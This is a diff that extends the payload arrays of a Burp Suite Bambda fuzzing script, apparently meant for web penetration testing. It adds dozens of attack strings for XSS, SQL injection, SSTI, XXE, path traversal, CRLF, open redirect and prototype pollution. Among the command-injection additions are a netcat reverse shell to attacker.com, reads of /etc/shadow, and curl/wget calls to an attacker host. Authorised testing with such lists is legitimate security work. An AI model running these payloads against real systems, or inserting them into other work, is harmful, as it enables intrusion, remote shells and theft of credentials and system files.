@@ -5,7 +5,7 @@
 <summary><strong>Quick Fuzzer</strong></summary>
 
 ```
-// Save as fuzzer.bambda -> Repeater Tab -> Custom-Scripts
+//Save as fuzzer.bambda -> Repeater Tab -> Custom-Scripts
 // This Bambda extracts all parameters and performs comprehensive fuzzing tests
 // You can add/reduce payloads
 // You can add/reduce test cases
@@ -50,7 +50,16 @@ int GLOBAL_DELAY_MS = 100;
 
 // Different Payloads for Different Attack Types, Add more as per requirement
 String[] SPECIAL_CHARS = {
-    "!@#$%^&*()", "<>\"'", "[]{}|\\", "~`+=", ";:,./?"    
+    "!@#$%^&*()",
+    "<>\"'",
+    "[]{}|\\",
+    "~`+=",
+    ";:,./?",
+    "%$#@!^*()_+",
+    "\'\";:,.<>/?|{}[]",
+    "\\\\\\\\",
+    "--++==",
+    "(){}[]<>"
 };
 
 String[] XSS_PAYLOADS = {
@@ -60,7 +69,14 @@ String[] XSS_PAYLOADS = {
     "<svg+onload=alert('XSS')>",
     "'-alert('XSS')-'",
     "\"><script>alert('XSS')</script>",
-    "<iframe+src=javascript:alert('XSS')></iframe>"
+    "<iframe+src=javascript:alert('XSS')></iframe>",
+    "<body+onload=alert('XSS')>",
+    "<details/open+ontoggle=alert('XSS')>",
+    "<input+onfocus=alert('XSS')+autofocus>",
+    "<marquee+onstart=alert('XSS')>",
+    "<a+href=javascript:alert('XSS')>click</a>",
+    "<img+src=1+onerror=prompt(1)>",
+    "<svg><script>alert(1)</script></svg>"
 };
 
 String[] SQLI_PAYLOADS = {
@@ -70,7 +86,16 @@ String[] SQLI_PAYLOADS = {
     "'+OR+1=1#",
     "admin'--",
     "'+OR+'a'='a",
-    "1'+OR+'1'='1'+/*"
+    "1'+OR+'1'='1'+/*",
+    "'--+-",
+    "'++OR+1=1--",
+    "'++UNION++SELECT+NULL--",
+    "'++AND+1=1--",
+    "'++AND+1=2--",
+    "'++WAITFOR+DELAY+'0:0:5'--",
+    "'++SLEEP(5)--",
+    "'++OR+sleep(5)--",
+    "'++OR+benchmark(1000000,MD5(1))--"
 };
 
 // Command Injection Payloads
@@ -84,7 +109,16 @@ String[] COMMAND_INJECTION_PAYLOADS = {
     "&&+echo+vulnerable",
     ";+ping+-c+1+127.0.0.1",
     "|+type+C:\\Windows\\System32\\drivers\\etc\\hosts",
-    "$(ping+-c+1+127.0.0.1)"
+    "$(ping+-c+1+127.0.0.1)",
+    "|+ls",
+    "&+whoami",
+    ";+id",
+    "|+cat+/etc/shadow",
+    "|+nc+-e+/bin/sh+attacker.com+4444",
+    "|+powershell+whoami",
+    "|+bash+-i",
+    "|+curl+http://attacker.com",
+    "|+wget+http://attacker.com"
 };
 
 // Path Traversal/Directory Traversal
@@ -96,7 +130,14 @@ String[] PATH_TRAVERSAL_PAYLOADS = {
     "..%252f..%252f..%252fetc%252fpasswd",
     "/etc/passwd%00",
     "file:///etc/passwd",
-    "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
+    "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
+    "..%2f..%2f..%2fetc%2fshadow",
+    "..\\..\\..\\boot.ini",
+    "..%5c..%5c..%5cwindows%5cwin.ini",
+    "..%255c..%255c..%255cwindows%255cwin.ini",
+    "..%c1%1c..%c1%1c..%c1%1cwindows%5cwin.ini",
+    "..%c0%ae..%c0%ae..%c0%aeetc%c0%aepasswd",
+    "..%e0%80%af..%e0%80%af..%e0%80%afetc%e0%80%afpasswd"
 };
 
 // LDAP Injection
@@ -107,7 +148,14 @@ String[] LDAP_INJECTION_PAYLOADS = {
     ")(cn=*",
     //    "*)(uid=*",
     //    "admin)(&(password=*))",
-    "*()|%26'"
+    "*()|%26'",
+    "*%29%28%7C%28objectClass%3D*",
+    "*%28%7C%28objectClass%3D*",
+    "*%29%28uid%3D*",
+    "*%29%28mail%3D*",
+    "*%29%28password%3D*",
+    "*%29%28cn%3D*",
+    "*%29%28sn%3D*"
 };
 
 // NoSQL Injection
@@ -118,7 +166,14 @@ String[] NOSQL_INJECTION_PAYLOADS = {
     "[$ne]=1",
     //    "';+return+true;+var+dummy='",
     //    "{\"$gt\":\"\"}",
-    //    "{\"$regex\":\".*\"}"
+    //    "{\"$regex\":\".*\"}",
+    "{$ne:null}",
+    "{$gt: ''}",
+    "{$lt: ''}",
+    "{$in: [null, 1, 'a']}",
+    "'||1==1||'",
+    "'||a==a||'",
+    "admin' || '1'=='1"
 };
 
 // Server-Side Template Injection (SSTI)
@@ -129,7 +184,14 @@ String[] SSTI_PAYLOADS = {
     "{{config}}",
     "<%=7*7%>",
     //    "${jndi:ldap://attacker.com/a}",
-    //    "{{request.application.__globals__}}"
+    //    "{{request.application.__globals__}}",
+    "{{self}}",
+    "{{request}}",
+    "{{url_for.__globals__.__builtins__.open('/etc/passwd').read()}}",
+    "{{().__class__.__bases__[0].__subclasses__()}}",
+    "{{[].__class__.__mro__[2].__subclasses__()}}",
+    "${{7*'7'}}",
+    "<%={{7*7}}%>"
 };
 
 // Format String Vulnerabilities
@@ -138,7 +200,14 @@ String[] FORMAT_STRING_PAYLOADS = {
     "%x%x%x%x%x%x%x%x%x%x",
     "%n%n%n%n%n%n%n%n%n%n",
     "%08x.%08x.%08x.%08x",
-    "AAAA%08x.%08x.%08x.%08x"
+    "AAAA%08x.%08x.%08x.%08x",
+    "%99999999999s",
+    "%99999999999d",
+    "%99999999999x",
+    "%99999999999n",
+    "%p %p %p %p %p",
+    "%#x",
+    "%#n"
 };
 
 // Email Validation Bypass
@@ -148,7 +217,14 @@ String[] EMAIL_BYPASS_PAYLOADS = {
     "test@",
     "@test.com",
     "test@test.",
-    "\"test\"@test.com"
+    "\"test\"@test.com",
+    "test@.com",
+    "test@com",
+    "test@-test.com",
+    "test@%31.com",
+    "test@sub..test.com",
+    "test@sub_test.com",
+    "test@sub+test.com"
 };
 
 // JSON Injection
@@ -156,30 +232,60 @@ String[] JSON_INJECTION_PAYLOADS = {
     "\",\"injected\":\"true\",\"a\":\"",
     "\"}}],\"injected\":true,\"a\":[{\"b\":\"",
     "\",\"admin\":true,\"test\":\"",
-    "\\\":\\\"\\\"}],\\\"injected\\\":true}"
+    "\\\":\\\"\\\"}],\\\"injected\\\":true}",
+    "\",\"isAdmin\":true,\"foo\":\"",
+    "\",\"$ne\":null,\"foo\":\"",
+    "\",\"$gt\":\"\",\"foo\":\"",
+    "\",\"$or\":[{},{}],\"foo\":\"",
+    "\",\"$where\":\"1==1\",\"foo\":\""
 };
 
 // Business Logic Tests
 String[] BUSINESS_LOGIC_PAYLOADS = {
     "0",
     "-1",
-    //    "999999999",
-    //    "-999999999",
-    //    "0.00",
-    //    "-0.01",
     "true",
     "false",
-    //    "null",
-    //    "undefined"
+    "999999999",
+    "-999999999",
+    "0.00",
+    "-0.01",
+    "null",
+    "undefined",
+    "NaN",
+    "Infinity",
+    "-Infinity"
 };
 
 
 String[] INVALID_DATES = {
-    "2024-13-01", "2024-02-30", "2024-00-15", "2024-12-32", "32/13/2024"
+    "2024-13-01",
+    "2024-02-30",
+    "2024-00-15",
+    "2024-12-32",
+    "32/13/2024",
+    "2024-02-31",
+    "2024-04-31",
+    "2024-06-31",
+    "2024-09-31",
+    "2024-11-31",
+    "2024-00-00",
+    "2024-99-99"
 };
 
 String[] INVALID_TIMES = {
-    "25:30:00", "12:70:30", "10:30:70", "99:99:99", "ab:cd:ef"
+    "25:30:00",
+    "12:70:30",
+    "10:30:70",
+    "99:99:99",
+    "ab:cd:ef",
+    "24:00:00",
+    "00:60:00",
+    "00:00:60",
+    "99:99:99",
+    "12:34:99",
+    "99:99:99AM",
+    "99:99:99PM"
 };
 
 // XML/XXE Injection
@@ -188,7 +294,12 @@ String[] XXE_PAYLOADS = {
     "<!DOCTYPE+foo+[<!ENTITY+xxe+SYSTEM+\"file:///c:/windows/win.ini\">]>",
     "<?xml+version=\"1.0\"?><!DOCTYPE+foo+[<!ENTITY+%+xxe+SYSTEM+\"http://attacker.com/evil.dtd\">%xxe;]>",
     "<!ENTITY+xxe+SYSTEM+\"expect://id\">",
-    "<![CDATA[<script>alert('XXE')</script>]]>"
+    "<![CDATA[<script>alert('XXE')</script>]]>",
+    "<?xml+version=\"1.0\"?><!DOCTYPE+foo+[<!ENTITY+xxe+SYSTEM+\"file:///c:/boot.ini\">]><foo>&xxe;</foo>",
+    "<!DOCTYPE+foo+[<!ENTITY+xxe+SYSTEM+\"file:///etc/shadow\">]>",
+    "<!DOCTYPE+foo+[<!ENTITY+xxe+SYSTEM+\"file:///proc/self/environ\">]>",
+    "<!DOCTYPE+foo+[<!ENTITY+xxe+SYSTEM+\"http://127.0.0.1:8080/evil.dtd\">]>",
+    "<!DOCTYPE+foo+[<!ENTITY+xxe+SYSTEM+\"file:///windows/win.ini\">]>"
 };
 
 // CRLF Injection
@@ -198,7 +309,13 @@ String[] CRLF_PAYLOADS = {
     "%0d%0a%0d%0a<script>alert('CRLF')</script>",
     "\\r\\nHeader-Injection:+true",
     "%E5%98%8A%E5%98%8DHeader-Injection:+true",
-    "%0d%0aSet-Cookie:+injected=true"
+    "%0d%0aSet-Cookie:+injected=true",
+    "%0d%0aContent-Length:+0",
+    "%0d%0aLocation:+evil.com",
+    "%0d%0aRefresh:+0;url=evil.com",
+    "%0d%0aX-Injected:+true",
+    "%0d%0aX-Forwarded-For:+evil.com",
+    "%0d%0aX-Real-IP:+evil.com"
 };
 
 // Open Redirect
@@ -210,7 +327,15 @@ String[] OPEN_REDIRECT_PAYLOADS = {
     "////evil.com",
     "https:evil.com",
     "//%0d%0aevil.com",
-    "/%09/evil.com"
+    "/%09/evil.com",
+    "//attacker.com",
+    "//google.com",
+    "//127.0.0.1",
+    "//localhost",
+    "//0.0.0.0",
+    "//[::1]",
+    "//user:pass@evil.com",
+    "//evil.com#@google.com"
 };
 
 // Unicode/Encoding Bypass
@@ -220,7 +345,13 @@ String[] UNICODE_BYPASS_PAYLOADS = {
     "%c0%3cscript%c0%3ealert('XSS')%c0%3c/script%c0%3e",
     "\\x3cscript\\x3ealert('XSS')\\x3c/script\\x3e",
     "%e0%80%3cscript%e0%80%3e",
-    "&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;"
+    "&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;",
+    "%u003Cscript%u003Ealert('XSS')%u003C/script%u003E",
+    "%u003Cimg+src=x+onerror=alert('XSS')%u003E",
+    "%u003Csvg+onload=alert('XSS')%u003E",
+    "%u003Ciframe+src=javascript:alert('XSS')%u003E%u003C/iframe%u003E",
+    "%u003Cbody+onload=alert('XSS')%u003E",
+    "%u003Cmarquee+onstart=alert('XSS')%u003E"
 };
 
 // Null Byte Injection
@@ -230,7 +361,14 @@ String[] NULL_BYTE_PAYLOADS = {
     "test%00.jpg",
     "..%00/etc/passwd",
     "test.php%00.jpg",
-    "\\0"
+    "\\0",
+    "%00.png",
+    "%00.gif",
+    "%00.txt",
+    "%00.html",
+    "%00.php",
+    "%00.asp",
+    "%00.jsp"
 };
 
 // IDOR Patterns
@@ -243,7 +381,16 @@ String[] IDOR_PAYLOADS = {
     "-1",
     "admin",
     "user",
-    "test"
+    "test",
+    "guest",
+    "root",
+    "superuser",
+    "administrator",
+    "owner",
+    "manager",
+    "support",
+    "qa",
+    "dev"
 };
 
 // Prototype Pollution
@@ -252,7 +399,12 @@ String[] PROTOTYPE_POLLUTION_PAYLOADS = {
     "constructor[prototype][test]=polluted",
     "__proto__.test=polluted",
     "{\"__proto__\":{\"polluted\":true}}",
-    "constructor.prototype.polluted=true"
+    "constructor.prototype.polluted=true",
+    "__proto__.admin=true",
+    "__proto__.isAdmin=true",
+    "__proto__.polluted=1",
+    "constructor.prototype.isAdmin=true",
+    "constructor.prototype.polluted=1"
 };
 
 // HTTP Parameter Pollution
@@ -261,7 +413,14 @@ String[] HPP_PAYLOADS = {
     "&role=admin",
     "&id=1&id=2",
     "&debug=true",
-    "&test=1"
+    "&test=1",
+    "&user=admin",
+    "&user=guest",
+    "&user=superuser",
+    "&user=administrator",
+    "&user=owner",
+    "&user=manager",
+    "&user=support"
 };
 
 // Get the request
